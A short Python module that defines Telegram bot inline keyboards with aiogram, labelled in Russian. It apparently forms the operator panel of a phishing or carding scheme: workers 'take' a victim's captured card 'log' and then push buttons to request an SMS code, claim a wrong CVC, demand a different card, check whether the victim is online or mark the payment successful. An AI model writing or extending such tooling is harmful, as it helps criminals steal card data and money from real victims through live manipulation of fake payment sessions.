from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

def get_take_log_keyboard(session_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="Взять лог", callback_data=f"take:{session_id}")]
    ])

def get_taken_keyboard(username: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text=f"Лог взял @{username}", callback_data="already_taken")]
    ])

def get_management_keyboard(session_id: str):
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="💰 Баланс", callback_data=f"balance:{session_id}"),
            InlineKeyboardButton(text="📞 SMS", callback_data=f"sms:{session_id}")
        ],
        [
            InlineKeyboardButton(text="🔄 Изменить карту", callback_data=f"change:{session_id}"),
            InlineKeyboardButton(text="❌ Неверный CVC", callback_data=f"wrong_cvc:{session_id}")
        ],
        [
            InlineKeyboardButton(text="✅ Успешная оплата", callback_data=f"success:{session_id}")
        ],
        [
            InlineKeyboardButton(text="🔍 Проверить онлайн", callback_data=f"check_online:{session_id}")
        ]
    ])